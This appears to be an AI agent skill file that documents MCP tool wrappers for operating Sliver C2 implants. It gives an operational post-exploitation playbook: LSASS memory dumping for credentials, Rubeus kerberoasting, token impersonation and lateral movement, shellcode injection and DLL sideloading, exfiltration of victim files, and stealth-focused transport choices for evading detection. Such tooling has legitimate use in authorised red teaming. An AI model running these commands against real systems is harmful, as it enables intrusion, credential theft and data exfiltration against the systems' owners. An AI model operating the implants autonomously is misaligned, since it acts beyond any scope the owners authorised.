---
name: sliver-c2
description: Sliver C2 post-exploitation methodology — sessions, beacons, implant commands, pivoting, and OPSEC. Use when operating Sliver implants, managing listeners, or performing post-exploitation tasks.
---

# Sliver C2 Post-Exploitation

## Concepts

**Sessions** — real-time interactive connections. Commands execute immediately.
**Beacons** — async callback implants. Commands are queued as tasks, results arrive on next check-in. Our MCP handles this transparently via `_resolve()`.

Always `connect()` first, then `interact(implant_id)` to set the active target before running implant commands.

## Orientation (do this first)

```
connect()                                          # or connect(config_file="/path/to/op.cfg")
get_sessions()                                     # list live sessions
get_beacons()                                      # list beacons
interact(implant_id="abc-123", implant_type="session")  # set active target
whoami()                                           # confirm user context
pwd() / ls()                                       # confirm position
ps()                                               # survey processes, spot security products
ifconfig()                                         # map network interfaces
netstat()                                          # check connections and listeners
get_env()                                          # check environment variables
```

## MCP Tools (41 total)

### Server Management

| Tool | Purpose |
|------|---------|
| `connect(config_file=)` | Connect to Sliver server |
| `get_sessions()` / `get_beacons()` | List implants |
| `get_jobs()` | List active listeners |
| `start_mtls_listener(host, port)` | Start mTLS listener (encrypted, authenticated) |
| `start_https_listener(host, port, domain)` | Start HTTPS listener (blends with web traffic) |
| `start_http_listener(host, port, domain)` | Start HTTP listener (unencrypted) |
| `start_dns_listener(domains, host, port)` | Start DNS listener (slow but evasive) |
| `kill_job(job_id)` | Stop a listener |
| `kill_session(session_id, force=)` | Terminate a session |
| `kill_beacon(beacon_id)` | Terminate a beacon |
| `get_implant_builds()` | List stored implant builds |
| `regenerate_implant(implant_name)` | Regenerate a previously compiled implant |

### File Operations

| Tool | Purpose |
|------|---------|
| `ls(path)` | List directory |
| `cd(path)` / `pwd()` | Navigate |
| `mkdir(path)` | Create directory |
| `rm(path, recursive=, force=)` | Remove file/directory |
| `upload(local_path, remote_path)` | Upload file to target |
| `download(remote_path)` | Download and save locally |
| `download_to_local_file(remote_path)` | Same, returns `{name, path}` |

### Execution

| Tool | Purpose |
|------|---------|
| `execute(exe, args=, output=True)` | Run a binary directly (no shell) |
| `execute_assembly(assembly_path, arguments=, is_dll=, arch=)` | In-memory .NET assembly execution |
| `execute_shellcode(shellcode_path, pid=0, rwx=False)` | Inject and run shellcode |
| `sideload(dll_path, entry_point=, arguments=, process_name=, kill=True)` | Load shared library into sacrificial process |

### Reconnaissance

| Tool | Purpose |
|------|---------|
| `ps()` | Process list with PID, PPID, owner |
| `ifconfig()` | Network interfaces |
| `netstat(tcp=, udp=, ipv4=, ipv6=, listening=)` | Active connections |
| `screenshot()` | Capture display |
| `get_env(name=)` | Environment variables |
| `terminate_process(pid, force=)` | Kill a process |

### Privilege & Identity (Windows)

| Tool | Purpose |
|------|---------|
| `whoami()` | Current user context |
| `impersonate(username)` | Impersonate a user's token |
| `make_token(username, password, domain=)` | Create logon token with creds |
| `revert_to_self()` | Drop impersonation |
| `run_as(username, process_name, args=)` | Run process as another user |
| `get_system()` | Elevate to NT AUTHORITY\SYSTEM |
| `steal_token` | Not yet a tool — use Sliver CLI or extensions |
| `process_dump(pid)` | Dump process memory (e.g. LSASS) |

### Registry (Windows)

| Tool | Purpose |
|------|---------|
| `registry_read(hive, reg_path, key, hostname=)` | Read registry value |
| `registry_write(hive, reg_path, key, string_value=, hostname=)` | Write registry value |

## Methodology

### Credential Access

**Dump LSASS** (requires SYSTEM or SeDebugPrivilege):
```
get_system()                                       # elevate first
process_dump(pid=<lsass_pid>)                      # dump LSASS memory
```
Find LSASS PID with `ps()`, then use offline tools (mimikatz, pypykatz) on the dump.

**Execute Rubeus/Seatbelt/SharpHound** via execute_assembly:
```
execute_assembly(assembly_path="/local/Rubeus.exe", arguments="kerberoast /format:hashcat")
execute_assembly(assembly_path="/local/Seatbelt.exe", arguments="-group=all")
execute_assembly(assembly_path="/local/SharpHound.exe", arguments="-c All -d domain.local")
```

**BOFs** (Beacon Object Files) — see `docs/sliver/reference/bof-and-coff-support.md`:
Use Sliver's armory to install BOF extensions, then execute via the Sliver CLI.

### Lateral Movement

**Token manipulation flow**:
1. `make_token(username="admin", password="pass", domain="DOMAIN")` — create token
2. Do lateral work (file access, registry, etc.)
3. `revert_to_self()` — drop the token

**Run commands on remote hosts**:
```
run_as(username="DOMAIN\\admin", process_name="cmd.exe", args="/c whoami")
```

**Pivoting** — see `docs/sliver/reference/pivots.md` and `docs/sliver/tutorials/5---pivots.md`:
Sliver supports TCP and named pipe pivots for reaching segmented networks. Use the Sliver CLI to set up pivot listeners, then generate pivot implants.

**Port forwarding** — see `docs/sliver/reference/port-forwarding.md`:
Forward local ports through the implant to reach internal services.

**SOCKS proxy** — see `docs/sliver/reference/reverse-socks.md`:
Route traffic through the implant into the target network.

### Persistence & Evasion

**Process injection**: `execute_shellcode(shellcode_path, pid=<target>)` or `sideload()` for DLLs.

**Sideloading** (load DLL into sacrificial process):
```
sideload(dll_path="/local/payload.dll", entry_point="DllMain", kill=True)
```

**Implant configuration**: Use `get_implant_builds()` and `regenerate_implant()` to manage implant variants. See `docs/sliver/reference/executable-metadata.md` for metadata stripping.

**AV evasion**: See `docs/sliver/reference/anti-virus-evasion.md` and `docs/sliver/reference/traffic-encoders.md`.

### Exfiltration

```
download(remote_path="C:\\Users\\admin\\Desktop\\secrets.xlsx")
```
Returns the file saved locally with path and size.

## C2 Transport Selection

Read the full docs at `docs/sliver/c2/`.

| Transport | Speed | Stealth | Notes |
|-----------|-------|---------|-------|
| mTLS | Fast | Moderate | Encrypted + authenticated, but unusual traffic pattern |
| HTTPS | Fast | High | Blends with web traffic, supports domain fronting |
| HTTP | Fast | Low | Unencrypted — use only for testing |
| DNS | Slow | Very high | Tunnels through DNS queries, extremely evasive |
| WireGuard | Fast | Moderate | VPN-based, good for persistent access |

## Beacons vs Sessions

Read `docs/sliver/tutorials/2---beacons-vs-sessions.md` for details.

- **Sessions**: Use for interactive work (enumeration, real-time commands). Higher risk — persistent connection is detectable.
- **Beacons**: Use for long-term access. Commands queue and execute on check-in. Configurable interval + jitter. Lower detection risk.

Our MCP tools work with both — `interact(implant_id, implant_type="beacon")` handles the async task resolution automatically.

## Sliver Native MCP

Sliver v1.6+ has built-in MCP support. See `docs/sliver/reference/mcp.md`. This provides direct access to ALL Sliver commands (not just the ones in our MCP wrapper). Consider using it alongside our MCP server for full coverage.
